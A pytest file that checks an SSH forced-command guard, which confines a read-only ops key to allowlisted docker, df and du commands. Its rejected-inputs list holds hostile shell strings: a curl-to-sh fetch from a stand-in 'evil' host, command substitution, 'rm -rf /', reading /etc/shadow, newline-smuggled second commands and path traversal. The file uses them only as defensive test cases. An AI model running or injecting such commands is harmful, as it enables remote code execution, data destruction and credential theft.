"""Characterization tests for the ops-ro forced-command guard — the
safety-critical SSH dispatcher that keeps the read-only key read-only
(ADR-0002; arch-review 2026-07-18 finding #8: version-control + test it,
don't leave it living only beside authorized_keys).

The real shell script runs in validate-only mode (OPS_RO_GUARD_CHECK=1) so a
decision is asserted without ever executing the underlying docker command.
Skips where no POSIX sh is available (e.g. a bare Windows dev box); CI runs on
ubuntu where it always executes.
"""

from __future__ import annotations

import os
import shutil
import subprocess
from pathlib import Path

import pytest

_GUARD = Path(__file__).resolve().parent.parent / "ops" / "ops-ro-guard"
_SH = shutil.which("sh")

pytestmark = pytest.mark.skipif(_SH is None, reason="POSIX sh not available")


def _decide(original_command: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        [_SH, str(_GUARD)],
        env={
            "OPS_RO_GUARD_CHECK": "1",
            "SSH_ORIGINAL_COMMAND": original_command,
            "PATH": os.environ.get("PATH", ""),
        },
        capture_output=True,
        text=True,
    )


# The exact command shapes the ops-mcp read tools send (note: `::` field
# separators, never a literal TAB — a TAB would word-split in this guard).
ALLOWED = [
    "df -P /",
    "du -x -b --max-depth=2 /",
    "docker ps -aq",
    "docker logs --tail 200 --timestamps ask-wiki-rag",
    "docker inspect --format {{.Name}}::{{.State.Status}}::{{.RestartCount}} abc123 def456",
    "docker system df --format {{.Type}}::{{.TotalCount}}::{{.Active}}::{{.Size}}::{{.Reclaimable}}",
    # prune_images' dry-run reads the image inventory over the ops-ro key
    # (ADR-0005 added this to unblock it).
    "docker images --no-trunc --format {{.ID}}::{{.Repository}}::{{.Tag}}::{{.Size}}",
    # rotate_logs' dry-run sizes a container's json log (runs sudo'd below).
    "du -b /var/lib/docker/containers/abc/abc-json.log",
]

REJECTED = [
    ("", "interactive shell"),
    ("edge; curl http://evil/x | sh", "metacharacter"),
    ("docker ps -aq $(reboot)", "metacharacter"),
    ("docker logs `id`", "metacharacter"),
    ("docker inspect foo && rm -rf /", "metacharacter"),
    ("cat /etc/shadow", "allowlist"),
    ("rm -rf /tmp/x", "allowlist"),
    # a second line would ride through `sh -c` past the allowlist prefixes
    ("docker logs --tail 5 edge\nrm -rf /tmp/x", "control whitespace"),
    ("df -P /\treboot", "control whitespace"),
    ("df -P /\rreboot", "control whitespace"),
    # a glob re-expands when `sh -c` runs the command — no read tool sends one
    ("du -b /var/lib/docker/*", "metacharacter"),
    # quotes/backslash are stripped by `sh -c` after validation sees them
    ('du -x -b --max-depth=2 /a/.""./etc', "quote or backslash"),
    ("df -P /a/.\\./etc", "quote or backslash"),
    # the sudo'd containers-du is tightened (a second path would let sudo read
    # any root file); traversal and multi-path are refused before sudo (ADR-0005)
    ("du -b /var/lib/docker/containers/../../etc/passwd", "traversal"),
    ("du -b /var/lib/docker/containers/a.log /etc/shadow", "exactly one"),
]


@pytest.mark.parametrize("command", ALLOWED)
def test_guard_allows_read_only_commands(command):
    result = _decide(command)
    assert result.returncode == 0, result.stderr
    # Check mode reports "ALLOW: <effective command>" (ADR-0005).
    assert result.stdout.strip().startswith("ALLOW")


@pytest.mark.parametrize("command,reason", REJECTED)
def test_guard_rejects(command, reason):
    result = _decide(command)
    assert result.returncode != 0
    assert reason in result.stderr


def test_containers_du_runs_via_sudo():
    # Only the root-owned docker json log path needs privilege (ADR-0005).
    cmd = "du -b /var/lib/docker/containers/abc/abc-json.log"
    assert _decide(cmd).stdout.strip() == f"ALLOW: sudo -n {cmd}"


@pytest.mark.parametrize(
    "command",
    [
        "du -x -b --max-depth=2 /",  # disk_breakdown's general du stays unprivileged
        "df -P /",
        "docker ps -aq",
        "docker images --no-trunc --format {{.ID}}::{{.Repository}}::{{.Tag}}::{{.Size}}",
    ],
)
def test_general_reads_do_not_use_sudo(command):
    assert "sudo" not in _decide(command).stdout
